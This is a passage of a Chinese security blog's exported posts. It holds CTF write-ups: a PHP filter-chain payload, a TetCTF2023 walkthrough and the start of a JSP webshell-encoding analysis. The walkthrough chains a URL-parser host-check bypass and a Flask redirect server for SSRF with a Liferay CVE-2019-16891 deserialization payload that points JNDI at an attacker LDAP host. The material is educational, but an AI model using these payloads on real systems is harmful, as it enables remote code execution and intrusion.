alt="image-20230117164606331"></p><p>当然最后发现工具也可以直接用，注意后面有俩空格</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python php_filter_chain_generator.py --chain <span class="string">&#x27;FREE  &#x27;</span></span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=flag</span><br></pre></td></tr></table></figure><p>本脚本小子觉得很有意思就是了</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117164803115.png" alt="image-20230117164803115"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023RealWorldCTF-由于有很多day就不公开了</title>
      <link href="/2023/01/10/year/2023/1/2023RealWorldCTF-%E7%94%B1%E4%BA%8E%E6%9C%89%E5%BE%88%E5%A4%9Aday%E5%B0%B1%E4%B8%8D%E5%85%AC%E5%BC%80%E4%BA%86/"/>
      <url>/2023/01/10/year/2023/1/2023RealWorldCTF-%E7%94%B1%E4%BA%8E%E6%9C%89%E5%BE%88%E5%A4%9Aday%E5%B0%B1%E4%B8%8D%E5%85%AC%E5%BC%80%E4%BA%86/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="a7dcd7e96eb318cd996aee084b8aafe91eba38060cbe46ef5daeb3c5d9e0a38c"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Python </tag>
            
            <tag> Nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)</title>
      <link href="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/"/>
      <url>/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="TetCTF2023-amp-Liferay-CVE-2019-16891-Pre-Auth-RCE"><a href="#TetCTF2023-amp-Liferay-CVE-2019-16891-Pre-Auth-RCE" class="headerlink" title="TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)"></a>TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)</h1><p>这周末打了这个比赛挺不错的一个，但是主要还是写一下这题，其他题虽然也有难度但是并不值得我记录</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先这题被拆分为了两个部分，觉得两部分都挺有意思的，就单独讲讲</p><p>part1主要是利用node与python的requests的差异性绕过host限制</p><p>part2主要是仅仅通过一个GET触发Liferay的RCE</p><p>关于题目备份也是放在了我的Git里：<a href="https://github.com/Y4tacker/CTFBackup/tree/main/2023/TetCTF">https://github.com/Y4tacker/CTFBackup/tree/main/2023/TetCTF</a></p><h2 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h2><p>首先一眼看到这个路由</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">&#x27;/api/getImage&#x27;</span>, isAdmin, validate, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br></pre></td></tr></table></figure><p>这里面有个鉴权操作，要求密码是<code>Th!sIsS3xreT0</code>但是长度不能大于12，很常规基础的考点了，通过数组就行<code>?password[]=Th!sIsS3xreT0</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isAdmin = <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (req.query.password.length &gt; <span class="number">12</span> || req.query.password != <span class="string">&quot;Th!sIsS3xreT0&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&quot;You don&#x27;t have permission&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        next();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.status(<span class="number">500</span>).send(<span class="string">&quot;Oops, something went wrong.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着来看看剩下的代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">&#x27;/api/getImage&#x27;</span>, isAdmin, validate, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> url = req.body.url.toString()</span><br><span class="line">        <span class="keyword">let</span> result = &#123;&#125;</span><br><span class="line">        <span class="keyword">if</span> (IsValidProtocol(url)) &#123;</span><br><span class="line">            <span class="keyword">const</span> flag = isValidHost(url)</span><br><span class="line">            <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;[DEBUG]: &quot;</span> + url)</span><br><span class="line">                <span class="keyword">let</span> res = <span class="keyword">await</span> downloadImage(url)</span><br><span class="line">                result = res</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result.status = <span class="literal">false</span></span><br><span class="line">                result.data = <span class="string">&quot;Invalid host i.ibb.co&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result.status = <span class="literal">false</span></span><br><span class="line">            result.data = <span class="string">&quot;Invalid url&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res.json(result)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        res.status(<span class="number">500</span>).send(error.stack)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里IsValidProtocol要求只能是<code>http/https</code>，isValidHost要求host只能是<code>i.ibb.co</code>这个图床网站(使用urlParse解析)</p><p>之后如果校验成功则会调用python去下载</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">f __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>):</span><br><span class="line">            exit()</span><br><span class="line">        url = sys.argv[<span class="number">1</span>]</span><br><span class="line">        headers = &#123;<span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;PythonBot/0.0.1&#x27;</span>&#125;</span><br><span class="line">        request = requests.session()</span><br><span class="line">        request.mount(<span class="string">&#x27;file://&#x27;</span>, LocalFileAdapter())</span><br><span class="line"></span><br><span class="line">        <span class="comment"># check extentsion</span></span><br><span class="line">        white_list_ext = (<span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.jpeg&#x27;</span>, <span class="string">&#x27;.gif&#x27;</span>)</span><br><span class="line">        vaild_extension = url.endswith(white_list_ext)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (vaild_extension):</span><br><span class="line">            <span class="comment"># check content-type</span></span><br><span class="line">            res = request.head(url, headers=headers, timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&#x27;image&#x27;</span> <span class="keyword">in</span> res.headers.get(<span class="string">&quot;Content-type&quot;</span>)</span><br><span class="line">                    <span class="keyword">or</span> <span class="string">&#x27;image&#x27;</span> <span class="keyword">in</span> res.headers.get(<span class="string">&quot;content-type&quot;</span>)</span><br><span class="line">                    <span class="keyword">or</span> <span class="string">&#x27;image&#x27;</span> <span class="keyword">in</span> res.headers.get(<span class="string">&quot;Content-Type&quot;</span>)):</span><br><span class="line">                r = request.get(url, headers=headers, timeout=<span class="number">3</span>)</span><br><span class="line">                <span class="built_in">print</span>(base64.b64encode(r.content))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print e</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>正常情况来说如果我们使用：<a href="http://evil.com@i.ibb.co/1.png">http://evil.com@i.ibb.co/1.png</a></p><p>node和python经过parse后访问的其实也都是<a href="http://i.ibb.co/1.png">http://i.ibb.co/1.png</a></p><p>那有没有什么办法让node和py行为相异，python的requests库是基于urllib实现的，这里我们看到去区分scheme, authority, path, query, fragment等部分是靠正则实现的<img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103112556025.png" alt="image-20230103112556025"></p><p>对应的正则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">URI_RE = re.compile(</span><br><span class="line">r&quot;^(?:([a-zA-Z][a-zA-Z0-9+.-]*):)?&quot;</span><br><span class="line">r&quot;(?://([^\\/?#]*))?&quot; 靠这些符号决定authority部分边界</span><br><span class="line">r&quot;([^?#]*)&quot;</span><br><span class="line">r&quot;(?:\?([^#]*))?&quot;</span><br><span class="line">r&quot;(?:#(.*))?$&quot;,</span><br><span class="line">re.UNICODE | re.DOTALL,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>因此如果最终我们使用的url是</p><p><code>http://evil.com1232\@i.ibb.co/1.png</code></p><p>node部分则会正确解析出host为i.ibb.co</p><p>python部分由于遇到了<code>\</code>字符其实是把后面整体当成了path，最终访问的url其实是</p><p><code>http://evil.com1232/\@i.ibb.co/1.png</code></p><p>如图测试</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/2.png" alt="image-2"></p><p>在这个基础上我们可以配合flask简单写个解析这个畸形路径的请求并重定向到指定位置即可完成ssrf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/\\@i.ibb.co/1.png&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;login fail&quot;</span>, <span class="number">302</span>, [(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;image&quot;</span>), (<span class="string">&quot;Location&quot;</span>, <span class="string">&quot;file:///usr/src/app/fl4gg_tetCTF&quot;</span>)]</span><br><span class="line">    <span class="comment"># return&quot;23333&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="string">&quot;1239&quot;</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h2 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h2><p>第二部分是这个Liferay的一个前台RCE，看DockerFile可以看到这个版本</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103113711919.png" alt="image-20230103113711919"></p><p>网上较多的是关于<code>cve-2020-7961</code>的内容，也就是靠<code>/api/jsonws/xxxx</code>去实现的RCE</p><p>然而这里有两个限制</p><p>第一个，从part1部分我们能得到一点，我们的SSRF只能触发一个GET请求</p><p>第二个，这里对路由做了些限制，也就是说我们的api相关路由都不能访问了咋办呢？</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103113942123.png" alt="image-20230103113942123"></p><p>关于这个我在网上搜索发现出题人曾发了一个这个文章</p><p><a href="https://vsrc.vng.com.vn/blog/liferay-revisited-a-tale-of-20k/">https://vsrc.vng.com.vn/blog/liferay-revisited-a-tale-of-20k/</a></p><p>在文章最后提到了这点验证了我们的猜想，同时也知道了大概也是和json反序列化有关</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103162546281.png" alt="image-20230103162546281"></p><p>之后的话又看到一篇文章</p><p><a href="https://dappsec.substack.com/p/an-advisory-for-cve-2019-16891-from">https://dappsec.substack.com/p/an-advisory-for-cve-2019-16891-from</a></p><p>这里像我们展示了一个新的路由</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103162733485.png" alt="image-20230103162733485"></p><p>从struts-config.xml当中可以看到对应的全类名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;action path=&quot;/portal/portlet_url&quot; type=&quot;com.liferay.portal.action.PortletURLAction&quot; /&gt;</span><br></pre></td></tr></table></figure><p>这个类在<code>/liferay-portal-6.1.2-ce-ga3/tomcat-7.0.40/webapps/ROOT/WEB-INF/lib/portal-impl.jar!/com/liferay/portal/action/PortletURLAction.class</code>下</p><p>从这里也可以看出是GET传参数也可以</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103163126821.png" alt="image-20230103163126821"></p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103163144288.png" alt="image-20230103163144288"></p><p>再往下看，可以得知这里是可以触发liferay的json反序列化</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103163218591.png" alt="image-20230103163218591"></p><p>这里我们挑重点来讲，最终反序列化会触发<code>org.jabsorb.JSONSerializer#unmarshall</code></p><p>这里他会调用<code>getSerializer</code>去选择一个能满足反序列化该javaCLass的类</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103164712565.png" alt="image-20230103164712565"><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103164852843.png" alt="image-20230103164852843"></p><p>首先遍历serializableMap看有没有该javaClass直接对应映射的处理，这个serializableMap当中有很多，但大多都是一些基础类型的类的处理</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103165025514.png" alt="image-20230103165025514"></p><p>没有的话它会继续遍历serializerList看看有没有能处理该类的，也就是其canSerialize返回true</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103165404537.png" alt="image-20230103165404537"></p><p>我们只需要关注两个即可，其他的也是一些基础类型之类的不需要过多关注</p><p>一个是com.liferay.portal.json.jabsorb.serializer.LiferaySerializer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canSerialize</span><span class="params">(Class clazz, Class jsonClass)</span> </span>&#123;</span><br><span class="line">        Constructor constructor = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            constructor = clazz.getConstructor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var4) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Serializable.class.isAssignableFrom(clazz) &amp;&amp; (jsonClass == <span class="keyword">null</span> || jsonClass == JSONObject.class) &amp;&amp; constructor != <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其对应的unmarshall方法当中，我们可以很清楚的看到只是通过一些反射去对class对应字段赋值</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103165939984.png" alt="image-20230103165939984"></p><p>另一个是org.jabsorb.serializer.impl.BeanSerializer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canSerialize</span><span class="params">(Class clazz, Class jsonClazz)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> !clazz.isArray() &amp;&amp; !clazz.isPrimitive() &amp;&amp; !clazz.isInterface() &amp;&amp; (jsonClazz == <span class="keyword">null</span> || jsonClazz == JSONObject.class);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其对应的unmarshall方法当中，则是调用对应的setter方法，这符合我们的要求</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103170046051.png" alt="image-20230103170046051"></p><p>这两个类处理最大的区别就是javaClasss是否继承了Serializable接口，因此我们找恶意类条件就是不能继承Serializable接口，同时set方法有恶意操作，这种时候就去看fastjson和jackson的黑名单就可以了</p><p>比如jackson里面黑名单里的一个类刚好在我们liferay当中</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103172040401.png" alt="image-20230103172040401"></p><p>同时其set方法有一个能直接触发jndi的</p><p><img src="/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/image-20230103172114714.png" alt="image-20230103172114714"></p><p>最终我们把这串代码放进之前的恶意flask触发重定向后，通过jndi攻击内网服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://admin-portal:80/c/portal/portlet_url?parameterMap=&#123;&quot;javaClass&quot;:&quot;org.hibernate.jmx.StatisticsService&quot;,&quot;sessionFactoryJNDIName&quot;:&quot;ldap://ip&quot;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Python </tag>
            
            <tag> Nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈JspWebshell之编码</title>
      <link href="/2022/11/27/year/2022/11/%E6%B5%85%E8%B0%88JspWebshell%E4%B9%8B%E7%BC%96%E7%A0%81/"/>
      <url>/2022/11/27/year/2022/11/%E6%B5%85%E8%B0%88JspWebshell%E4%B9%8B%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="浅谈JspWebshell之编码"><a href="#浅谈JspWebshell之编码" class="headerlink" title="浅谈JspWebshell之编码"></a>浅谈JspWebshell之编码</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>​    最近@phithon在知识星球中分享了一个多重编码的webshell姿势后，先膜一下大佬</p><p><img src="/2022/11/27/year/2022/11/%E6%B5%85%E8%B0%88JspWebshell%E4%B9%8B%E7%BC%96%E7%A0%81/0.png"></p><p>出于对代码实现的好奇简单看了看tomcat的具体实现以及尝试是否能够更深入的目的也便有了本篇，当然后面也发现这种方式不太灵活是<code>有一定编码限制</code>的，后面也会提到，当然最终经过我的努力，发现了其他<code>三种实现双重编码的方式</code>，甚至最后发现可以实现<code>三重编码</code></p><p>那么下面就进入正文吧</p><h2 id="环境相关及其他说明"><a href="#环境相关及其他说明" class="headerlink" title="环境相关及其他说明"></a>环境相关及其他说明</h2><p>​    本篇以tomcat8.0.50为例进行分析，后文简称为tomcat，同时讨论的是第一次访问并编译jsp的过程(有小区别不重要)并且不涉及到其他小版本差异</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>这里没有那么多废话，我们知道其实jsp是Servlet技术的扩展，它本身也是一种模板，通过对这个模板内容的解析，根据一定规则拼接到一个java文件后最终会编译为一个class文件并加载，在这个过程当中就涉及的很多解析的过程，这里由于主题限制，我们不必太过关心，我们重点偏向于去了解它的编码是如何被识别的即可.</p><p>对于这部分处理逻辑其实是由<code>org.apache.jasper.compiler.ParserController#determineSyntaxAndEncoding</code>做处理，在这个类方法当中有两个比较重要的属性<code>isXml</code>与<code>sourceEnc</code>，字面理解就能得出一个判定是否jsp格式是通过xml格式编写，另一个<code>sourceEnc</code>也就决定着jsp文件的编码相关</p><h3 id="关于xml格式的一些简单说明"><a href="#关于xml格式的一些简单说明" class="headerlink" title="关于xml格式的一些简单说明"></a>关于xml格式的一些简单说明</h3><h4 id="xml声明"><a href="#xml声明" class="headerlink" title="xml声明"></a>xml声明</h4><p>这里我们我们只需要知道encoding属性可以决定内容编码即可</p><p>tomcat对于xml格式还算比较严格，其中如果需要用到xml声明<code>&lt;?xml</code>要求“必须”在首位，说明下这里的必须指的是需要解析并获取这个标签中的属性，比如encoding就决定着后续内容的编码，我们需要它生效就需要将这个xml声明放置在文件内容最前面(Ps：这里的最前面指的是被解码后的字符在文件最前面，并不是一定要求是原生的字符串&lt;?xml)，当然如果不需要其实这里就不太重要了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span></span><br></pre></td></tr></table></figure><p>如果个人比较好奇这部分代码逻辑可以自行看看<code>org.apache.jasper.xmlparser.XMLEncodingDetector#getEncoding(java.io.InputStream, org.apache.jasper.compiler.ErrorDispatcher)</code></p><h4 id="如何识别我们的文件内容是xml格式"><a href="#如何识别我们的文件内容是xml格式" class="headerlink" title="如何识别我们的文件内容是xml格式"></a>如何识别我们的文件内容是xml格式</h4><p>接下来再来简单说说是如何识别我们的文件是xml格式的呢？</p><p>首先是根据后缀名<code>.jspx</code>或<code>.tagx</code>，当然这俩不在我们今天讨论的范围内</p><p>如果后缀名不符合则根据文本内容是否包含有形如<code>&lt;xxx:root</code>格式的文本，如果有也会识别为一个xml格式</p><h3 id="如何决定一个文件的编码"><a href="#如何决定一个文件的编码" class="headerlink" title="如何决定一个文件的编码"></a>如何决定一个文件的编码</h3><h4 id="如何从字节顺序标记-BOM-判断文本内容编码"><a href="#如何从字节顺序标记-BOM-判断文本内容编码" class="headerlink" title="如何从字节顺序标记(BOM)判断文本内容编码"></a>如何从字节顺序标记(BOM)判断文本内容编码</h4><p>简单来说这部分逻辑其实和W3C所定义的一致</p><p>W3C定义了三条XML解析器如何正确读取XML文件的编码的规则：<br> 1.如果文挡有BOM(字节顺序标记)，就定义了文件编码<br> 2.如果没有BOM，就查看XML encoding声明的编码属性<br> 3.如果上述两个都没有，就假定XML文挡采用UTF-8编码</p><p>我们的tomcat对这部分实现也是手写根据文件前4个字节(BOM)来决定文件的编码(<code>org.apache.jasper.compiler.ParserController#determineSyntaxAndEncoding</code>)</p><p>具体是通过函数<code>XMLEncodingDetector#getEncoding</code>来动态决定编码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object[] getEncoding(InputStream in, ErrorDispatcher err)</span><br><span class="line">  <span class="keyword">throws</span> IOException, JasperException</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">this</span>.stream = in;</span><br><span class="line">  <span class="keyword">this</span>.err=err;</span><br><span class="line">  createInitialReader();</span><br><span class="line">  scanXMLDecl();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Object[] &#123; <span class="keyword">this</span>.encoding,</span><br><span class="line">                       Boolean.valueOf(<span 